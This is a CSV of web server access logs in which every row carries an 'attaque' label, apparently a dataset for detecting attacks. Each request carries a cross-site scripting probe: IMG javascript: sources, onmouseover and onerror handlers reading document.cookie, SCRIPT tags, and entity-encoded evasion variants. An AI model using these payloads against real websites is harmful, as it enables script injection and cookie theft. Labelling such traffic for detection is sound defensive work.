"","ip","date","hour","minute","seconds","zone","request1","request2","status","respsize","url","computer","attaque"
"79","192.108.116.88","18/Dec/2017","13","45","45","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 8",1
"80","192.108.116.88","18/Dec/2017","13","45","45","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 3",1
"81","192.108.116.88","18/Dec/2017","13","45","45","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 3",1
"82","192.108.116.88","18/Dec/2017","13","47","45","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"83","192.108.116.88","18/Dec/2017","13","49","46","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"84","192.108.116.88","18/Dec/2017","13","50","02","+0000","GET "," HTTP/1.1/NA/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 76",1
"85","192.108.116.88","18/Dec/2017","13","50","02","+0000","GET ","css/index.css HTTP/1.1/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 41",1
"86","192.108.116.88","18/Dec/2017","13","50","02","+0000","GET ","img/logo.png HTTP/1.1/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 172",1
"87","192.108.116.88","18/Dec/2017","13","50","03","+0000","POST ","datalab HTTP/1.1/NA/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 204",1
"88","192.108.116.88","18/Dec/2017","13","50","03","+0000","GET ","css/index.css HTTP/1.1/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"89","192.108.116.88","18/Dec/2017","13","50","03","+0000","GET ","img/logo.png HTTP/1.1/datalab <a onmouseover=""alert(document.cookie)"">xxs link</a> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 8",1
"90","192.108.116.88","18/Dec/2017","13","50","27","+0000","GET "," HTTP/1.1/NA/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 5",1
"91","192.108.116.88","18/Dec/2017","13","50","27","+0000","GET ","css/index.css HTTP/1.1/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 6",1
"92","192.108.116.88","18/Dec/2017","13","50","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"93","192.108.116.88","18/Dec/2017","13","50","28","+0000","POST ","datalab HTTP/1.1/NA/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 284",1
"94","192.108.116.88","18/Dec/2017","13","50","28","+0000","GET ","css/index.css HTTP/1.1/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 33",1
"95","192.108.116.88","18/Dec/2017","13","50","28","+0000","GET ","img/logo.png HTTP/1.1/datalab <a onmouseover=alert(document.cookie)>xxs link</a> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 37",1
"96","192.108.116.88","18/Dec/2017","13","50","44","+0000","GET "," HTTP/1.1/NA/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 221",1
"97","192.108.116.88","18/Dec/2017","13","50","44","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 97",1
"98","192.108.116.88","18/Dec/2017","13","50","44","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 74",1
"99","192.108.116.88","18/Dec/2017","13","50","45","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 133",1
"100","192.108.116.88","18/Dec/2017","13","50","45","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"101","192.108.116.88","18/Dec/2017","13","50","45","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>""> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"102","192.108.116.88","18/Dec/2017","13","51","05","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 34",1
"103","192.108.116.88","18/Dec/2017","13","51","05","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"104","192.108.116.88","18/Dec/2017","13","51","05","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"105","192.108.116.88","18/Dec/2017","13","51","06","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 166",1
"106","192.108.116.88","18/Dec/2017","13","51","06","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"107","192.108.116.88","18/Dec/2017","13","51","06","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 14",1
"108","192.108.116.88","18/Dec/2017","13","51","26","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 43",1
"109","192.108.116.88","18/Dec/2017","13","51","27","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 99",1
"110","192.108.116.88","18/Dec/2017","13","51","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 14",1
"111","192.108.116.88","18/Dec/2017","13","53","27","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"112","192.108.116.88","18/Dec/2017","13","55","27","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=# onmouseover=""alert('xxs')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"113","192.108.116.88","18/Dec/2017","13","55","41","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 39",1
"114","192.108.116.88","18/Dec/2017","13","55","41","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 7",1
"115","192.108.116.88","18/Dec/2017","13","55","42","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 10",1
"116","192.108.116.88","18/Dec/2017","13","57","41","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"117","192.108.116.88","18/Dec/2017","13","59","42","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC= onmouseover=""alert('xxs')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"118","192.108.116.88","18/Dec/2017","13","59","57","+0000","GET "," HTTP/1.1/NA/datalab <IMG onmouseover=""alert('xxs')""> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 14",1
"119","192.108.116.88","18/Dec/2017","13","59","57","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG onmouseover=""alert('xxs')""> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 3",1
"120","192.108.116.88","18/Dec/2017","13","59","58","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG onmouseover=""alert('xxs')""> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 3",1
"121","192.108.116.88","18/Dec/2017","14","01","57","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG onmouseover=""alert('xxs')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"122","192.108.116.88","18/Dec/2017","14","03","58","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG onmouseover=""alert('xxs')""> ",NA,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 NA",1
"123","192.108.116.88","18/Dec/2017","14","04","14","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 35",1
"124","192.108.116.88","18/Dec/2017","14","04","15","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 55",1
"125","192.108.116.88","18/Dec/2017","14","04","15","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 4",1
"126","192.108.116.88","18/Dec/2017","14","04","15","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 171",1
"127","192.108.116.88","18/Dec/2017","14","04","16","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"128","192.108.116.88","18/Dec/2017","14","04","16","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 12",1
"129","192.108.116.88","18/Dec/2017","14","04","41","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 62",1
"130","192.108.116.88","18/Dec/2017","14","04","41","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 40",1
"131","192.108.116.88","18/Dec/2017","14","04","41","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 11",1
"132","192.108.116.88","18/Dec/2017","14","04","42","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 167",1
"133","192.108.116.88","18/Dec/2017","14","04","42","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
"134","192.108.116.88","18/Dec/2017","14","04","42","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40; ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 3",1
"135","192.108.116.88","18/Dec/2017","14","04","57","+0000","GET "," HTTP/1.1/NA/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 5",1
"136","192.108.116.88","18/Dec/2017","14","04","57","+0000","GET ","css/index.css HTTP/1.1/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 7",1
"137","192.108.116.88","18/Dec/2017","14","04","57","+0000","GET ","img/logo.png HTTP/1.1/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 5",1
"138","192.108.116.88","18/Dec/2017","14","04","58","+0000","POST ","datalab HTTP/1.1/NA/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 147",1
"139","192.108.116.88","18/Dec/2017","14","04","58","+0000","GET ","css/index.css HTTP/1.1/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 1",1
"140","192.108.116.88","18/Dec/2017","14","04","58","+0000","GET ","img/logo.png HTTP/1.1/datalab &#39;&#88;&#83;&#83;&#39;&#41;> ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 0",1
"141","192.108.116.88","18/Dec/2017","14","05","17","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 159",1
"142","192.108.116.88","18/Dec/2017","14","05","17","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",200,945,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 29",1
"143","192.108.116.88","18/Dec/2017","14","05","17","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",200,34463,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 65",1
"144","192.108.116.88","18/Dec/2017","14","05","18","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",200,1073,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 556",1
"145","192.108.116.88","18/Dec/2017","14","05","19","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 15",1
"146","192.108.116.88","18/Dec/2017","14","05","19","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097& ",304,NA,"http://31.14.135.81:3000/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 44",1
"147","192.108.116.88","18/Dec/2017","14","05","37","+0000","GET "," HTTP/1.1/NA/datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> ",200,1040,NA,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 2",1
